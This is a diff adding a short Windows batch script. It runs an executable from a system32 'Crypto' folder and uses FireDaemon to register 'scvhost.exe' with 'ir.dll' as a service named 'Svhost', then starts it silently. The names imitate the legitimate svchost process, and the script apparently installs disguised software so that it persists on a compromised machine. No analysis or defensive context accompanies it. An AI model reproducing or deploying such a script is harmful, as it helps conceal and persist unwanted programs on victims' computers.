@@ -1,0 +1,7 @@
+@echo off
+C:\WINNT\system32\Microsoft\Crypto\first.exe
+set MXBIN=C:\WINNT\system32\Microsoft\Crypto
+set MXHOME=C:\WINNT\system32\Microsoft\Crypto
+C:\WINNT\system32\Microsoft\Crypto\FIREDAEMON.exe -i Svhost "C:\WINNT\system32\Microsoft\Crypto" "C:\WINNT\system32\Microsoft\Crypto\scvhost.exe" "ir.dll" Y 0 0 N Y
+TYPE NUL | C:\WINNT\system32\Microsoft\Crypto\wait.com /N /CY /TY,3 >NUL
+net start Svhost
